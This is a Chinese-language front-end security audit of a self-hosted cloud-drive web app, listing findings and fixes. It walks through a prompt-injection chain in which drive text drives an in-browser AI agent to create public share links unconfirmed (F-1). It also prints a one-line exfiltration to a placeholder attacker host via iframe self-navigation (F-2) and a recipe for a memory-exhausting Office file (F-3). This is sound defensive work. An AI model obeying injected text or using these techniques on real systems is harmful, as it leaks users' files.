# 前端安全审计（React / TypeScript 渲染面）

审计对象：`D:\编程\Wangyq EPan 网盘\EPan\web\src`（v2.0.0-beta）
审计方式：**只读代码审计**，未运行浏览器、未启动服务、未修改任何源码。可机械验证的部分用 `node --experimental-strip-types` 直接跑纯函数（见 §8 复现）。
参照的既有报告：`SECURITY-AUDIT.md` §六「前端缺陷」、`SECURITY-REVIEW.md` D-2 / D-7 / M-3 / L-8。
服务端配套结论取自：`server/src/csp.js`、`server/index.js`、`server/src/routes/fs.js`、`server/src/routes/shares.js`、`server/src/routes/plugins.js`。

---

## 一、结论摘要

1. **Markdown 渲染器（手写实现）目前是安全的，且结论可机械复现。** 它采用"先整体 `escapeHtml`、再解析"的策略，原始 HTML 一律降级为纯文本；唯一的白名单（13 个标签）**只放行标签本身、属性一律丢弃**，因此不存在属性闭合 / 事件处理器注入。我用 10 组 payload 实测（含 `<span onmouseover=…>`、`<span/title="a">`、属性值里嵌 `>`），输出里没有任何属性残留（§8）。**内联 HTML 白名单是本次唯一经过"跑代码"验证的结论。**
2. **上传的 `.html/.svg` 无法在网盘源下执行脚本：四层防护都在，且互相独立。** 前端三处 iframe 全部只有 `sandbox="allow-scripts"`（无 `allow-same-origin`）；服务端对 scriptable 内联响应（`html/htm/svg`）强制 `Content-Security-Policy: sandbox allow-scripts`；`htmlPreview` 权限点在服务端强制（构造 `?inline=1` 绕不过去）；全局 `X-Content-Type-Options: nosniff` 让"伪造 `.pdf`/`.txt` 的 HTML"也走不通。**.svg 在所有路径上都只以 `<img>` 呈现**（`previeweType` → `image`），不是 `<object>`/`<iframe>` 文档。
3. **两个真实的新问题，都属于"授权边界"而不是"转义边界"**：
   - **F-1（中）** `webmcp.ts` 在**用户零确认**的情况下，把「创建公开分享链接」「创建/覆盖文本文件」「吊销分享」等写能力交给浏览器内 AI 代理，且所有浏览器（支持 `navigator.modelContext` 时）默认开启。这是既有报告 L-8 的**未修复续存**，本次补齐了完整利用链。
   - **F-2（中）** 插件 iframe 的"零网络 / 数据出不去"前提**不成立**：CSP `default-src 'none'` 不拦**帧自身导航**，`postMessage(…, "*")` 又把 `event.source` 当作插件身份（窗口绑定而非文档绑定）。一个持有 `fs.read` 的插件可以直接 `location.href = "https://attacker/?d=" + 文件内容` 把数据带出网盘。
4. **OOXML 预览的 zip 炸弹（D-2）已经修好**（`zip.ts` 改成边读边计数、跨条目共享预算），但**同一类 DoS 在"解析树规模"这一层仍然敞开**：解压字节上限是 192MB，而 XML 元素数、ppt 幻灯片数都没有上限（F-3）。
5. **未发现可确认的 XSS 通道。** 全量 grep：`dangerouslySetInnerHTML` 仅 1 处（`preview-page.tsx:336`，喂的是本报告第 1 条那个已验证安全的渲染器）；`innerHTML` 0 处；`eval` / `new Function` / `document.write` / `srcdoc` / `allow-same-origin` 0 处；`target="_blank"` 全部带 `rel="noopener noreferrer"`；无硬编码密钥、无 `localStorage` 存凭据。

严重度分布：中 2、低 5、疑似待验证 4、设计取舍 7。

---

## 二、已修复验证（逐条对照旧报告）

| 旧编号 | 旧问题 | 当前状态 | 证据 |
|---|---|---|---|
| **D-2（SECURITY-REVIEW）** | 前端 OOXML 预览 `inflateRaw` 用 `new Response(stream).arrayBuffer()` 一次性解压，无输出上限 → zip 炸弹 | **已修复** | `web/src/lib/office/zip.ts:57-96` 改为 `getReader()` 逐块累加，超预算立即 `reader.cancel()` 并抛 `OfficeError("too_large")`；`zip.ts:144,163-175` 用**跨条目共享**的 `inflated` 预算（`budget = Math.min(MAX_ENTRY_BYTES, MAX_TOTAL_BYTES - inflated)`），并且不再相信中央目录里的 `e.size` 声明值 |
| **§六-1** | `doPaste` 重入标志在冲突对话框往返之间才置位 → 重复 `POST /fs/copy` | **已修复** | `pages/browser-page.tsx:417-419` 在函数入口置位、`release()` 在取消分支（`:425`）与 `finally`（`:466`）都复位；`handleUpload` 也补了 `uploadingRef`（`:561-568`） |
| **§六-2** | `resolveConflicts` 只依赖 `[existingNames]`，文件夹上传用 `existingDirNames` 却不在依赖里 | **已修复** | `browser-page.tsx:520-533` 改成把 `dirNames` 作为**参数**传入（`resolveConflicts(names, dirNames, cb)`），调用点 `:577`、`:611` 各自传入正确的集合；`handleUpload` 依赖数组已含 `existingDirNames`（`:641`） |
| **§六-3** | `avatar-cache` 的 `owner` 变化时不同步清 `url`（短暂显示上一个成员头像） | **已修复** | `lib/avatar-cache.ts:216-237` 把 `{owner,url}` 一起放进 state，并在 `state.owner !== key` 时同步回退缓存（`:236`） |
| **§六-4** | `trash-section` 的 `busyId` 同 tick 置位/复位，`disabled` 永不生效 | **已修复** | `pages/settings/trash-section.tsx:225` 用 `disabled={busyId === it.id}`，`doRestore` 改为异步 `void doRestore(...)`（`:226`） |
| **§六-5** | 服务端返回 `truncated` 时只弹警告、`okCount` 口径错 | **已修复（口径已对齐）** | `state/uploads.tsx:88-94` 用 `batch.length - raw.results.length` 累加 `dropped`，`:99-100` 用 `results.length - failed.length`，`:121-127` 提示里带上真实丢弃数 |
| **§六-6/7/8** | 编辑器 keydown 依赖数组、`format.ts` 的 `ext()`、preview 的 PDF iframe 无 sandbox | **维持"不改"的原判** | 三条我复核后同意旧报告的结论：keydown 闭包总是最新（`editor-page.tsx:313-328` 无依赖数组）；`ext()` 的 `i > 0` 让 `.gitignore`/`.env` 与 `PREVIEWABLE` 成员匹配（`format.ts:124-127`）；PDF iframe 见 §5 S-2 |
| **D-7（SECURITY-REVIEW）** | 同源第三方 JS 未锁完整性 | **仍未修复（仍可接受）** | `web/index.html:10-11` 仍是 `<script src="/resources/lucide.min.js" defer>` / `gsap.min.js`，无 `integrity`。两个文件在 `web/public/resources/`（仓库内、不在 `FILES_DIR`），所以**当前没有通过网盘接口改写它们的路径**；仅作供应链信任点记录 |
| **M-3（SECURITY-REVIEW）** | 插件 `permissions` 只声明不执行 | **已修复** | `components/plugins/plugin-frame.tsx:85-91` `requirePerm()` 是强制点，四个方法各自校验 `fs.read` / `fs.write` / `ui.toast`；`saveText` 额外判 `canWrite`（`:110`） |
| **L-8（SECURITY-REVIEW）** | WebMCP 把文件与分享能力暴露给浏览器内 AI 代理 | **未修复，且范围扩大** → 见 **F-1** | — |

---

## 三、确认的新问题

> 说明：以下每条都标了 `file:line`，并区分 **CONFIRMED（数据流可从代码完整追到 sink）** 与 **SUSPECTED（需浏览器/真实环境确认，见 §5）**。本报告里的"确认"= 代码路径与判定条件已完整读出，不依赖运行时猜测。

### F-1【中·CONFIRMED】WebMCP：无用户手势、默认开启，把「创建公开分享链接」交给浏览器内 AI 代理

**位置**

- `web/src/App.tsx:47`、`:78-82`
- `web/src/state/webmcp.tsx:34-37`
- `web/src/lib/webmcp.ts:82-392`（尤其是 `:248-344` 的分享三件套、`:214-245` 的建文件）

**证据**

```tsx
// web/src/App.tsx:47
const hasWebMcp = typeof navigator !== "undefined" && "modelContext" in navigator
…
// web/src/App.tsx:78-82  —— 只要浏览器有这个对象就挂载，没有任何开关/同意
{hasWebMcp && (
  <Suspense fallback={null}>
    <WebMcpBridge />
  </Suspense>
)}
```

```tsx
// web/src/state/webmcp.tsx:34-37
React.useEffect(() => {
  if (!ready) return
  return installWebMcpTools(me, expiry)      // 登录态一变就重建全部工具
}, [ready, me, expiry])
```

```ts
// web/src/lib/webmcp.ts:248-295（节选）
if (me.role !== "guest") {
  tools.push({
    name: "zeroshadow_share_create",
    …
    execute: async (args) => {
      const row = await createShare({ path, expireSeconds: preset.seconds, password: … })
      return { ok: true, … url: new URL(row.url, window.location.origin).href }
    },
  })
```

工具清单（`buildTools()`）：读类 `zeroshadow_list_files` / `_search_files` / `_file_details` / `_get_download_url` / `_whoami` / `_shared_download_url` / `_share_list`；**写类** `zeroshadow_create_folder`（`:187`，需 `perms.mkdir`）、`zeroshadow_create_text_file`（`:214`，需 `perms.upload`）、`zeroshadow_share_create`（`:249`）、`zeroshadow_share_revoke`（`:326`）。文件里**没有任何确认对话框 / 二次校验**，`execute` 直接发 `/api` 请求。

**数据流**：`navigator.modelContext`（浏览器内置 AI 代理）→ `tool.execute(args)` → `api.post("/shares", …)`（`lib/api.ts:721-723`）→ 服务端生成公开 token → 返回值里带 `url`（`webmcp.ts:289`）。反向的读链路是：代理调 `zeroshadow_get_download_url`（`:167-184`）拿到**带当前会话的有效下载直链**，再调 `zeroshadow_share_create` 把它变成**谁都能下**的公开链接。

**影响**：网盘里任何"代理能读到的文本"（分享进来的 `.md`、文件名、聊天记录式的 todo）都变成**间接提示注入**的载体：攻击者只要让一段文本落在网盘里并让代理读到，就能驱动代理①取得文件直链、②新建公开分享、③把 URL 交给任意出站通道。整条链**不需要用户任何一次点击/确认**。此外 `zeroshadow_create_text_file` 让代理能往网盘写内容（可被用来投放更"可信"的注入文本）。

**触发条件**：①浏览器实现了 `navigator.modelContext`（当前为 Chrome 带 flag 的实验特性，`App.tsx:47` 的特性检测就是唯一门槛）；②访问者已登录且非 guest；③页面内的 AI 代理调用了这些工具（是否调用由代理/模型决定，应用侧不设门槛）。

**修复建议**（按性价比排序）

1. **默认关闭**：加一个客户端设置项（`lib/client-settings.tsx` 已有基建）或服务端策略（如 `config.webmcp.enabled=false`），只有用户显式打开后才 `installWebMcpTools`；
2. **写类/分享类工具必须逐个确认**：在 `execute` 里先 `await confirm(...)`（项目已有 `components/confirm-dialog.tsx` 的 `ConfirmProvider`），把"路径 + 有效期 + 是否公开"原样展示给用户；
3. **去掉或收窄 `zeroshadow_share_create`**：至少要求 `password` 必填并且不允许 `expireKey` 取最长档；或改成"只返回待创建的申请，由用户点确认后真正创建"；
4. 在 `README`/设置页明确写"开启 agent 授权 = 让代理以你的身份操作网盘"，并给出一键吊销（`clearContext`）的入口。

---

### F-2【中·CONFIRMED（判定逻辑） / SUSPECTED（需浏览器确认导航未被拦）】插件沙箱"零网络"承诺不成立：CSP 不拦自身导航 + `postMessage("*")` 把窗口当身份

**位置**

- `web/src/components/plugins/plugin-frame.tsx:72-75`、`:138-172`
- 服务端 CSP：`server/src/routes/plugins.js:76-88`
- 被推翻的注释：`plugin-frame.tsx:14-22`、`server/src/routes/plugins.js:61-68`

**证据**

```tsx
// web/src/components/plugins/plugin-frame.tsx:72-75
const post = React.useCallback((message: unknown, transfer?: Transferable[]) => {
  const win = frameRef.current?.contentWindow
  if (win) win.postMessage(message, "*", transfer ?? [])   // ← 目标源通配
}, [])
```

```tsx
// web/src/components/plugins/plugin-frame.tsx:139-153
const onMessage = (event: MessageEvent) => {
  const frame = frameRef.current
  if (!frame || event.source !== frame.contentWindow) return   // ← 只认"窗口"，不认"文档"
  …
  if (data.type === "zs:ready") {
    post({ type: "zs:init", apiVersion: 1, file: { path, name, size, mtime },
           settings: plugin.settings || {}, canWrite, dark: … })
```

```js
// server/src/routes/plugins.js:78-88
"default-src 'none'",
"script-src 'unsafe-inline'",
"style-src 'unsafe-inline'",
"img-src data: blob:",
"connect-src 'none'",
"base-uri 'none'",
"form-action 'none'",
"sandbox allow-scripts",
```

**关键点**：这份 CSP 把所有**子资源/请求**都锁死了（`connect-src 'none'`、`img-src data: blob:`、`form-action 'none'`），但 CSP 里**没有、也无法**约束"帧导航自己"——`navigate-to` 已从 CSP 规范移除、Chrome 从未实现；`sandbox` 的导航限制只作用于**顶层与其他**浏览上下文，文档导航**自身**永远允许。因此插件（或任何进入该 frame 的文档）可以：

1. 通过宿主代执行 `readText`（声明了 `fs.read` 即可，`plugin-frame.tsx:92-97`）拿到**任意**文件内容（路径可被 `params.path` 覆盖，`:80`）；
2. `location.href = "https://attacker/?d=" + encodeURIComponent(text)` 把内容带出；
3. 新文档落在**同一个 `contentWindow`** 上，于是 `event.source !== frame.contentWindow` 依然为 false → 宿主把它**继续当插件**，`zs:init`（含文件路径、插件 settings）与 `readText/saveText` 代执行能力全部交给这个外部页面。

**数据流**：文档字节（`/api/fs/file`）→ 宿主 `readText` → `postMessage` → 插件 iframe → 自身导航 → 外部服务器。以及：外部页面 `postMessage({type:"zs:ready"})` → `event.source` 命中 → 宿主回 `zs:init`（泄露路径/设置）。

**影响**：插件声明的"自包含 + 零网络"是评审放行第三方插件的基础假设；该假设不成立意味着**一个 `fs.read` 插件可以把整个网盘（在访问者权限内）读走**，而 `fs.write` 插件可以覆盖任意文件。M-3 修的只是"权限声明是否被执行"，没修"执行后数据能否离开"。

**触发条件**：①管理员安装并启用了一个 `fileType` 插件；②该插件（或其依赖的任何被注入内容）执行 `location.*` 导航；③用户打开一个该插件负责的后缀的预览。

**修复建议**

1. **把"身份"绑到文档而不是窗口**：`zs:init` 里带一个随机 `nonce`，插件必须在后续每条 `zs:request` 回传；同时监听 iframe 的 `load` 事件——**第二次 load 即视为导航**，立刻 `removeEventListener` + 清 `plugin.settings` 并使面板进入 failed 态（这是当前架构下最省事的有效封堵）；
2. 服务端给插件入口额外加 `Content-Security-Policy: … ; frame-src 'none'`（堵链式嵌套）并考虑在 CSP 里加 `sandbox allow-scripts` **同时**用 `iframe` 的 `csp` 属性双重下发；
3. 收缩 `params.path` 覆盖：`fileType` 插件的能力应默认限定在**当前预览的文件**（`path`），需要别的路径必须显式在清单里声明（如 `fs.read:any`），把"整盘读"从默认变成显式；
4. 文档/注释里删掉"连子资源都发不出去"这句承诺（`plugin-frame.tsx:16-17`、`plugins.js:63-64`），改成"不能发请求，但可用自身导航外带数据"。

---

### F-3【中低·CONFIRMED（放大路径）】OOXML 预览：解压字节有上限，但 XML 元素数与幻灯片数没有上限

**位置**

- `web/src/lib/office/zip.ts:38-40`（唯一的两个上限都是**字节**）
- `web/src/lib/office/xml.ts:75-150`（整棵树一次性建成）
- `web/src/lib/office/pptx.ts:951-958`（幻灯片循环无上限）
- `web/src/lib/office/xlsx.ts:59-60`、`:373-401`（400×60 的上限在**解析之后**才生效）

**证据**

```ts
// web/src/lib/office/zip.ts:38-40
const MAX_TOTAL_BYTES = 192 * 1024 * 1024
const MAX_ENTRY_BYTES = 64 * 1024 * 1024
```

```ts
// web/src/lib/office/xml.ts:144-147  —— 每个元素都建成一个 4 字段对象并 push 进父的 children
const node: XmlNode = { name, attrs: {}, children: [], text: "" }
if (spaceAt >= 0) parseAttrs(body.slice(spaceAt), node.attrs)
stack[stack.length - 1].children.push(node)
```

```ts
// web/src/lib/office/pptx.ts:951-958  —— 没有 slides.length 上限，也没有对重复 target 去重
for (const sldId of kids(child(pres, "sldIdLst"), "sldId")) {
  const rel = rid ? rels.get(rid) : undefined
  if (!rel || rel.external) continue
  const parsed = await parseSlide(pkg, rel.target, width, height, mediaPaths)
  slides.push(parsed.slide)
```

**数据流 / 放大计算**：`fetch(url)`（`office-preview.tsx:76-84`，原始文件 ≤48MB）→ `openZip` 逐条解压（≤192MB）→ `parseXml` 把文本变成对象树。deflate 的极限压缩比约 1032:1，而 `<a/>`（4 字节）解压后是**一个对象 + 数组元素**（V8 下 ≥100 字节）：**约 40KB 的 `.xlsx/.docx` 就能造出 1000 万个节点（≈1GB+ 常驻）**，标签页直接 OOM。`pptx` 另有一条不依赖解压比的放大：`.rels` 里放 N 条 `Relationship`（不同 `Id`、**同一个 `Target`**，`package.ts:150-160` 按 `Id` 建表、不去重 `Target`），`presentation.xml` 里放 N 个 `sldId` 指向它们，`parsePptx` 就会对**同一个部件**解析 N 次（每次 `parseSlide` 还会重建 layout/master/theme 的样式表，`pptx.ts:519-555`）。

**影响**：点开预览即卡死/OOM。只影响查看者自己的浏览器（服务端数据不受损），但对"把分享链接发给别人看"的场景很现实——这是 D-2 修好之后**同一威胁模型的残留**。

**触发条件**：`preview` 权限 + 一个恶意 `.docx/.xlsx/.pptx`（可上传，也可通过分享页被他人打开）。

**修复建议**

1. `parseXml` 加节点预算：`if (++nodeCount > MAX_NODES) throw new OfficeError("too_large")`（`MAX_NODES` 取 20 万量级对真实文档足够）；
2. `parsePptx` 加 `MAX_SLIDES`（如 200）并对 `rel.target` 去重（`Set`），重复 target 复用已解析结果；
3. `openZip` 再加一条"条目数上限"（当前 `count` 直接来自 EOCD 的 `uint16`，最多 65535）；
4. 把 `zip.ts:38-40` 的两个常量下调（例如总 48MB / 单条 16MB），与 `office-preview.tsx:39` 的 `MAX_BYTES=48MB` 对齐——目前"原始 48MB 可解出 192MB"。

---

### F-4【低·CONFIRMED】分享票据放在 URL 查询串里（并在 `sessionStorage` 落一份）

**位置**：`web/src/lib/api.ts:836-843`、`web/src/pages/share-page.tsx:34-51`

**证据**

```ts
// web/src/lib/api.ts:836-843
export function shareDownloadUrl(token: string, path: string, ticket: string, inline = false) {
  const params = new URLSearchParams()
  if (path) params.set("path", path)
  if (ticket) params.set("t", ticket)          // ← 票据进查询串
  if (inline) params.set("inline", "1")
  return `/api/share/${encodeURIComponent(token)}/download?${params.toString()}`
}
```

```ts
// web/src/pages/share-page.tsx:44-51
function writeTicket(token: string, ticket: string) {
  try {
    if (ticket) sessionStorage.setItem(TICKET_PREFIX + token, ticket)
```

**影响**：票据（密码验证后的短期凭证，最长 2 小时）出现在①浏览器历史、②`<img>/<iframe>` 的 `src`、③右键"复制链接/新标签打开"（`share-page.tsx:282,291,388` 都会把 `ticket` 拼进 URL）后的地址栏、④反向代理 / 隧道提供方的访问日志（本应用自己的请求日志只打 `req.path`，不含 query，`server/index.js:70-74`，这一点是对的）。拿到票据 = 绕过密码直接浏览/下载该分享。`Referrer-Policy: no-referrer` 是全局的（`server/index.js:80`），所以**外链 Referer 泄露不成立**，风险等级因此压到"低"。

**修复建议**：票据改走 Cookie（`HttpOnly` + `Path=/api/share/<token>`，服务端已有 cookie 基建）或 `Authorization` 头；`<a download>` 场景可由前端先 `fetch` 成 blob 再下载（`api.ts:400-440` 的 `triggerDownload` 已经是这个模式）。

---

### F-5【低·CONFIRMED（不构成注入，属加固缺失）】XLSX 颜色值只校验长度、不校验字符集

**位置**：`web/src/lib/office/xlsx.ts:173-179`

**证据**

```ts
function argbToHex(value: string | undefined): string | undefined {
  if (!value) return undefined
  const hex = value.replace(/^#/, "")
  if (hex.length === 8) return `#${hex.slice(2).toLowerCase()}`   // ← 不验证 [0-9a-f]
  if (hex.length === 6) return `#${hex.toLowerCase()}`
  return undefined
}
```

**为什么还不是漏洞**：该值最终只进 `style={{ backgroundColor: cell.fill, color: cell.color }}`（`office-preview.tsx:363-369`），React 是按**属性**写 CSSOM（`style.backgroundColor = …`），非法值被静默丢弃；`background-color`/`color` 都不接受 `url()`，所以**没有 CSS 注入，也没有 `javascript:`**。相比之下 `docx.ts:208,463` 与 `pptx.ts:123,236` 都是严格 `^[0-9a-fA-F]{6}$` / `HEX6`——这里是全项目**唯一**把文档字符串未经字符类校验就送进 `style` 的地方。

**修复建议**：加 `if (!/^[0-9a-fA-F]{6,8}$/.test(hex)) return undefined`。否则一旦有人把 `backgroundColor` 改成 `background`（支持 `url()` 的简写），立刻变成可外带的 CSS 注入。

---

### F-6【低·CONFIRMED】`vite.config.ts` 的 `server.host: true` 把开发服务器连同 Vite 的 `/@fs` 文件读取能力暴露到整个局域网

**位置**：`web/vite.config.ts:130-139`

**证据**

```ts
server: {
  host: true,          // ← 监听 0.0.0.0
  port: 5173,
  proxy: { "/api": { target: `http://localhost:${backendPort()}`, changeOrigin: false } },
},
```

**影响**：`pnpm dev:web`（`package.json:10`）一跑，同网段任何人都能访问 `http://<开发机>:5173/`，并按 Vite dev 的 `/@fs/<绝对路径>` 语义读取**开发机上该用户可读的任意文件**（`server.fs.allow` 默认放行项目根）。这不是生产面的问题，但本项目"局域网 + 人人会开 dev"的使用习惯让它值得记一条——尤其这台机器同时挂着网盘的 `.env` 与 `data/.jwt-secret`。

**修复建议**：改成 `host: "127.0.0.1"`（要给别人看就用 `npm run build` + `node server/index.js`），或至少加 `server.fs.strict: true` + `server.allowedHosts`。

---

### F-7【低·CONFIRMED】预览页切换文件时不清空 `text`，短时间内会"新文件名 + 旧文件内容"

**位置**：`web/src/pages/preview-page.tsx:120-133`

**证据**

```tsx
React.useEffect(() => {
  if (supported && kind === "text" && url) {
    fetch(url, { credentials: "same-origin" })
      .then(async (r) => { if (r.ok) setText(await r.text()); else setText(t("ui.dialogs.load_failed")) })
      .catch(() => setText(t("ui.dialogs.load_failed")))
  }                                   // ← 没有 setText(null) / setText(loading)
  …
}, [url, kind, supported, navigate, t])
```

**影响**：`text` 只在成功/失败回调里被覆盖，`url` 变化到新内容到达之间，顶部标题已是**新文件名**，正文还是**上一个文件的内容**（`preview-page.tsx:336` 与 `:342` 都直接渲染 `text`）。属"内容与名称错配"的展示缺陷：可能让人对着 A 的名字读 B 的正文，从而在编辑/复制时弄错对象。**不是 XSS**（走文本节点 / 已验证安全的渲染器）。

**修复建议**：在 effect 开头 `setText(null)`（`dialogs.tsx:771` 的 `PreviewDialog` 就是正确写法，可参照）。

---

## 四、逐项回答审计清单（未发现问题的部分，附"为什么安全"）

1. **Markdown 渲染器（手写）** — 安全。见 §8 实测：`renderSafeTags(escapeHtml(src))` 对 10 组 payload 全部只输出裸标签；`BAD_URL = /^\s*(?:javascript|vbscript|data):/i`（`markdown.ts:41`）覆盖三种危险协议；**更关键的是只有 `external === true` 的地址才会原样进 `href`/`src`，而 `external` 要求 `^[a-z][\w+.-]*:` 或 `//`（`markdown-urls.ts:30`）**——所有"走私"变体（`\u0001javascript:`、`javascript\t:`、`%6a%61vascript:`）都落进"网盘内相对路径"分支，最终被 `encodeURIComponent()` 编到 `?path=` 里，**永远到不了 URL scheme 位置**。
   - 不支持参考式链接定义（`[x]: …`）→ 清单里问的"reference definition 指向误导 URL"在当前实现里**根本没有解析入口**，只会作为正文显示。
   - 不生成 `srcset`、`<iframe>`、`<object>`、`<base>`、`<meta>`；`<base>` 还被 `base-uri 'none'` 二次封死（`csp.js:36`）。
   - 服务端还有第三层：`script-src 'self'`（无 `'unsafe-inline'`）会让 `javascript:` 导航直接被 CSP 拦掉（可在 `web/public/robustness/index.js:730` 那些 `href="javascript:void(0)"` 上观察到——CSP 下它们确实不可执行，只有 `onclick` 属性赋值生效）。所以即便未来渲染器被改坏，`javascript:` 链接在**本站源**上仍会被拦。
2. **SVG/HTML/图片预览的 Content-Type 与渲染方式** — 见摘要第 2 条。`svg` 在前端只走 `previewType()==="image"` → `<img>`；服务端 `INLINE_TYPES` 给 `svg` 的 `image/svg+xml` 一定伴随 `CSP: sandbox allow-scripts`（`fs.js:302-304`、`shares.js:343-345`），且 `htmlPreview` 权限在服务端强判（`fs.js:274-293`，注释明确写了"旧实现只在浏览器拦，直接构造 `?inline=1` 就绕过去了"）。
3. **preview-page / html-page 的 iframe** — `html-page.tsx:55` 与 `dialogs.tsx:843` 都是 `sandbox="allow-scripts"`，无 `allow-same-origin`、无 `allow-forms`、无 `allow-popups`、无 `srcdoc`；`preview-page.tsx:287` 的 PDF iframe 无 sandbox（见 S-2）。
4. **编辑器** — 纯 `<textarea>`（`editor-page.tsx:525-542`），值走 React `value` 属性，零 HTML 注入面；查找/替换不做高亮渲染（无 `innerHTML`），只用 `setSelectionRange`（`:221`）；`replaceAll` 的 `new RegExp(needle)` 是**用户自己**的正则，只可能自伤（ReDoS 影响自己的标签页），且 `matches` 循环有 5000 次护栏（`:192,207`）。
5. **Office / OOXML** — zip 见 D-2 已修复；**XXE / 实体扩展 / 十亿笑声全部不成立**：`xml.ts` 是手写扫描器，`<!DOCTYPE …>` 只被"跳到下一个 `>`"跳过（`:110-115`），**不建实体表、不展开自定义实体、不做任何外部取回**；`decodeEntities` 只认 5 个命名实体 + 数字实体，且 `&#…;` 有 `0 ≤ code ≤ 0x10FFFF` 与 `String.fromCodePoint` 的 try/catch 兜底（`:36-48`）。**不使用 DOMParser**（`xml.ts:4-8` 的注释解释得很清楚），所以既没有 XXE 也没有 `DOMParser` 的解析差异问题。远端引用：`readRels` 遇到 `TargetMode="External"` 只保留 URL 字符串，`docx.ts:313`（`if (!rel || rel.external) return undefined`）与 `pptx.ts:865` 都**拒绝**外链图片，不会发出任何请求。
6. **webmcp.ts** — 见 F-1。
7. **postMessage** — 全仓只有 `plugin-frame.tsx` 一处 `addEventListener("message")`；`targetOrigin` 通配的原因（不透明源下 `event.origin` 恒为 `"null"`，`plugin-frame.tsx:32-33` 已写明）在技术上成立，但"用窗口代替文档做身份"是 F-2 的根因。其余 iframe 没有消息通道。
8. **全量 grep** — `dangerouslySetInnerHTML`×1（`preview-page.tsx:336`，已论证安全）、`innerHTML` 0、`outerHTML` 0、`eval(` 0、`new Function` 0、`document.write` 0、`insertAdjacentHTML` 0、`srcdoc` 0、`javascript:` 0（`web/src` 内）、`localStorage/sessionStorage` 只存主题/语言/侧边栏宽度/小组上下文 + 分享票据（F-4），**无凭据、无 token、无密码**；`Bearer`/`Authorization`/`X-Api-Key` 0 处；无硬编码密钥。
9. **第三方资源** — `web/index.html` 两个同源脚本无 `integrity`（D-7，未修但当前不可改写）；`web/public/robustness/*` 是独立静态页，CSP 与主站同一份 `SHELL_CSP`（`server/index.js:180-190,202`），并且**所有**用户可控字符串都过 `esc()`（`robustness/index.js:236-244`；`html:` 分支在全文**没有任何调用点**，`el()` 的注释与实现一致）；`.xml/.txt/.log` 一律以 `text/plain` 内联（`fs.js:180-209`）+ 全局 `nosniff`，不会变成可执行文档。

### CSP 兼容性核查（`server/src/csp.js` 的 `SHELL_CSP`）

| 指令 | 值 | 前端是否有依赖 | 备注 |
|---|---|---|---|
| `script-src` | `'self'` | ✅ Vite 产物全是外部 chunk；`index.html` 无内联脚本 | 顺带封死 `javascript:` 导航 |
| `style-src` | `'self' 'unsafe-inline'` | ✅ React 内联 `style={{…}}` + `plugin-theme.ts:17-34` 的 `<style>` 注入 | 主题 CSS 由服务端 `themeCss()` 拼好，令牌值过 `TOKEN_VALUE_BAD`（`manifest.js:54`，禁 `;{}@<>\`、`url(`、`expression(`、`javascript:`） |
| `img-src` | `'self' data: blob: http: https:` | ✅ Office 图片走 `blob:`（`office-preview.tsx:129`）、Markdown 外链图走 `https:` | 有意放开外链图，代价见 §6 |
| `media-src` | `'self' blob:` | ✅ `<video>/<audio src=/api/…>` | — |
| `connect-src` | `'self'` | ✅ 无外部 API 调用 | WebMCP 走同源 `/api` |
| `object-src` / `base-uri` | `'none'` | ✅ 无 `<object>`/`<base>` | — |
| `frame-ancestors` / `X-Frame-Options` | `'self'` / `SAMEORIGIN` | ✅ | 第三方无法内嵌网盘（点击劫持已封） |
| `frame-src` | **未声明 → 回落 `default-src 'self'`** | ✅ 三处 iframe 的 `src` 都是 `/api/...` | 若将来要内嵌外部文档必须显式加，别顺手放宽 `default-src` |

**结论：前端没有与现有 CSP 冲突的写法，也没有"只能靠放宽 CSP 才能工作"的功能。** 唯一值得记录的耦合是 `img-src http:/https:`（Markdown 外链图）与 `style-src 'unsafe-inline'`（React 内联样式 + 主题插件）——两者都是有意为之，且都不构成脚本执行通道。

---

## 五、疑似待验证（需要浏览器 / 真实环境）

| 编号 | 假设 | 为什么只能"疑似" | 验证方法 |
|---|---|---|---|
| **S-1** | 沙箱 iframe 里的上传 HTML 能否通过自身导航把"它知道的东西"带出（同样的机制用于 F-2） | CSP 与 sandbox 的导航语义是按规范推的，没有实测 | 造一个 `sandbox="allow-scripts"` + `CSP: sandbox allow-scripts` 的 iframe，页面里 `location.href="https://example.com/?x=1"`，看是否发生跳转 |
| **S-2** | PDF 的四个 iframe（`preview-page.tsx:287`、`dialogs.tsx:840`、`share-page.tsx:296`、`robustness/index.js:1278`）**都没有 `sandbox`** | 依赖"浏览器内置 PDF 阅读器不执行 JS" + 全局 `nosniff`（`server/index.js:78`）挡住"伪装成 pdf 的 html"。这是**平台假设**，不是代码保证 | 传一个 `.pdf` 却是 HTML 的文件，确认浏览器只显示解析失败；再传一个带 `/OpenAction` JS 的 PDF，确认不执行 |
| **S-3** | F-3 的 pptx 重复 `sldId` 放大能否真的达到"卡死"量级 | 需要实测 `parseSlide` 单次耗时与 React 渲染 2000+ 缩略图按钮的开销 | 生成 5000 个 `sldId` 指向同一 slide 的 pptx，在 Chrome Performance 面板里看主线程 |
| **S-4** | F-5 若未来把 `backgroundColor` 改写成 `background`，是否立刻可利用 | 当前**不可利用**，是"未来改动风险" | 代码评审守则：`style` 里出现 `background`/`border-image`/`mask` 时必须同时收紧 `argbToHex` |

---

## 六、设计取舍（不算缺陷，但必须知道边界在哪）

1. **Markdown 空白名单（13 个标签）换掉了"渲染任意 HTML"**：`<table>/<details>/<a name>` 等都不会渲染，用户会看到源码 + 顶部提示条（`preview-page.tsx:320-325`）。这是安全换体验的主动选择，实现方式（先转义再放行裸标签）是对的。
2. **`img-src http: https:` 允许 `.md` 里嵌外链图** → 分享一个 `.md` 给外部人看时，图片服务器能拿到查看者的 IP/UA（追踪像素）。已用全局 `Referrer-Policy: no-referrer` 把"来源页面"这一项去掉（`csp.js:22-30` 的注释说明得很完整）。如果哪天要更严，可加"点击后才加载外链图"的占位。
3. **插件是"装你信任的"**：服务端 `server` 类插件不是沙箱（`server/src/plugins/runner.js:14-21` 自己写明了"这不是安全沙箱，而是故障隔离"）；前端 `fileType` 插件的隔离边界是"不透明源 + 零 connect"，而这份边界对**导航**无效（F-2）。真正可靠的做法是只装自己审过的插件。
4. **`postMessage(…, "*")` 在**不透明源**下是唯一可行写法**（`plugin-frame.tsx:32-33` 的注释正确：不透明源的 `event.origin` 恒为 `"null"`，用它做同源判断等于没判断）。所以问题不在 `"*"`，而在"没有把消息绑定到具体文档"。
5. **分享票据存 `sessionStorage`**（`share-page.tsx:30-32`）：关标签即失效、不进 localStorage，对"公开分享页不该有长期凭据"这个目标是合理的；代价是同一标签页内的任何脚本都能读到（F-4 的 URL 泄露面更大）。
